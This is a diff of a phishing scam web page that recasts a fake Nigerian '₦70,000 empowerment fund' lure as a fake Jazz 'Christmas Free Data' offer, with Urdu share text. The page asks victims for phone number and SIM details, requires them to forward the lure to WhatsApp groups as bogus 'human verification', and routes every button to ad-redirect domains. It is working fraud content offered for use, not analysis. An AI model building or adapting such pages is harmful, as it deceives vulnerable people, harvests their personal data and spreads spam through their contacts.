@@ -386,7 +386,10 @@ button:hover {
             <div id="num">0%</div>
         </div>
         <div id="info">
-            <p class="title"> ENTER YOUR INFORMATION:</p>
+            <p class="title"> ENTER YOUR INFORMATION:</p><br/>
+			<!-- BEGIN: Powered by Supercounters.com -->
+<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1725877,"ffffff","ffffff");</script><!-- END: Powered by Supercounters.com -->
+
             <div class="phone">
                 <center>
 					<input type="char" placeholder="Phone Number" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;margin-bottom: 20px;" onkeypress="return numberonly(event);">
@@ -461,16 +464,15 @@ button:hover {
   Dear Customer,
 </p>
 <p style="font-size: 16px; color: #333;">
-    Your reward of <span id="getstate" style="color: darkred;"></span> Free Data 
+    Your <span id="getstate" style="color: green;"></span> Free Data 
     is currently <b style="color: darkred;">under review</b>.
     Kindly follow the steps below to complete your verification process.
   </p>
 
   <div style="background: #f9f9f9; padding: 15px; border-left: 4px solid green; margin: 20px 0;">
-    <p><b>Customer Details (for verification purposes):</b></p>
+    <p><b style="color: darkred;">Customer Details:</b></p>
 	<p><b>Phone Number:</b> <span id="getname" style="color: green;"></span></p>
     <p><b>Sim Card:</b> <span id="getbank" style="color: green;"></span></p>
-    <p><b>Pending Reward:</b> <span id="getstate" style="color: green;"></span></p>
     <p><b>Country Flag:</b> <span id="getcounty" style="color: green;"></span></p>
     
   </div>
@@ -480,22 +482,18 @@ button:hover {
         </center>
             <p class="">
                 <br><h3 style="color: green;">🎉 Congratulations!</h3>
+
 <br>
   <p style="font-size: 16px; color: #333;">
-    Your application has been <b>successfully received</b>, and you have been 
-    <b>pre-qualified</b> to receive the <b>₦70,000 NIYEEDEP EMPOWERMENT FUND</b>.
-  </p>
-<br>
-  <p style="font-size: 16px; color: #333;">
-    To finalize your payment, please <b>complete the human verification process</b> 
-    by following the instructions below. Once verification is completed, your 
-    account will be credited within <b>24–48 hours</b>.
+    To start using your Free Data, please <b>complete the human verification process</b> 
+    by following the instructions below. Once verification is completed, you 
+    will get a notification on your mobile number <b>24–48 hours</b>.
   </p>
 
             </p><br>
             <p class="tip">1. Share this informations with others (5 groups or 15 friends on WhatsApp) (Click on the "SHARE" icon below).</p>
             <br><p class="tip">2. You will be redirected automatically to our "<b>Human verification approved page</b>" after the GREEN verification bar is filled.</p>
-            <br><p class="tip">3.Click on confirm after Completing the human verification task.</p>
+            <br><p class="tip">3.Click on ACTIVATE after Completing the human verification task.</p>
             
             <button id="whatsapp">SHARE</button> 
              <div class="barr">
@@ -544,24 +542,21 @@ button:hover {
           
           
             <p class="title"> Your information has been received.
-Click the link below to approve your payment to the bank details you provided during the registration process.
-Please note that payments may take 24 to 48 hours to reflect, as a large number of beneficiaries are currently being processed.</p>
+Click the link below to activate your Christmas Free Data .
+Please note that Data may take 24 to 48 hours to reflect, as a large number of beneficiaries are currently being processed.</p>
             
              <br/>
           <a  onclick="window.open('http://outrotomr.com/4/3144603')" href="https://obqj2.com/4/6798333" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="#ffffff">GET PAYMENT</font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="#ffffff">ACTIVATE</font></button>
                     </a><br/>
           
 
           <a  onclick="window.open('http://outrotomr.com/4/3144603')" href="https://obqj2.com/4/6798333" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="#ffffff">GET CONFIRMATION EMAIL</font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="#ffffff">GET NOTIFICATION</font></button>
                     </a><br/>
-            <!-- BEGIN: Powered by Supercounters.com -->
-<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_t.js"></script><script type="text/javascript">sc_online_t(1642698,"Users Online","ffffff");</script><br><noscript><a href="https://www.supercounters.com/">supercounters.com</a></noscript>
-</center>
-<!-- END: Powered by Supercounters.com --><br/>
+           <br/>
           <a  onclick="window.open('http://outrotomr.com/4/3144603')" href="https://obqj2.com/4/6798333" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="#ffffff">CHECK PAYMENT STATUS</font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="#ffffff">CHECK DATA BALANCE</font></button>
                     </a><br/>
             
             
@@ -730,13 +725,7 @@ $(document).click(function () {
   // Live update for State
   $("#state").on("change", function() {
     $("#getstate").html($(this).val());
-    $("#getstate").css("color", "green");
-  });
-
-	  // Live update for State
-  $("#state").on("change", function() {
-    $("#getstate").html($(this).val());
-    $("#getstate").css("color", "green");
+    $("#getstate").css("color", "darkred");
   });
 
   // Live update for Bank
@@ -769,7 +758,7 @@ $(document).click(function () {
 "*30%20GB%20Free%20Internet%20Offer*%0A%E2%9D%A4%0ATo%20Activate%2030%20GB%20Free%20Internet%20for%20all%20Networks%20click%20here%F0%9F%91%87%0A*1.%20Jio*%0Ahttps://cutt.ly/30-GB_Jio%0A%20%0A*2.%20Airtel*%0Ahttps://cutt.ly/30-GB_Airtel%0A%20%0A*3.%20Vi*%0Ahttps://cutt.ly/30-GB_Vi%0A%20%0A*4.%20Jazz*%0Ahttps://cutt.ly/30-GB_Jazz%0A%20%0A*5.%20Zong*%0Ahttps://cutt.ly/30-GB_Zong%0A%20%0A*6.%20Telenor*%0Ahttps://cutt.ly/30-GB_Telenor%0A%20%0A*7.%20Ufone*%0Ahttps://cutt.ly/30-GB_Ufone%0A%20%0A*8.%20Other Networks*%0Ahttps://cutt.ly/Get_30GB",
 -->
    <script>
-          var text1 ="*APPLY FOR NIYEEDEP EMPOWERMENT FUND 2025/2026*%0A%0AAre you a Citizen of Nigeria? The Federal Government has approved the payment of *₦70,000 NIYEEDEP EMPOWERMENT FUND* for all the Nigerians across the States.%0A%0AAPPLY HERE👉: https://rhward.org/nigerian %0ASHARE WITH OTHER NIGERIANS TO BENEFIT.",
+          var text1 ="*جاز کرسمس اور نئے سال کی پیشکش۔ کیا آپ جاز کے صارف ہیں؟ جاز کرسمس اور نئے سال کی خوشی میں نئے اور پرانے صارفین کو مفت انٹرنیٹ ڈیٹا دے رہا ہے... یہاں پیشکش حاصل کریں👉: https://lhegit.org/jazz-xmas",
         
             text2 = " an amount of ",
             text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly Ã°Å¸â€˜â€° ",
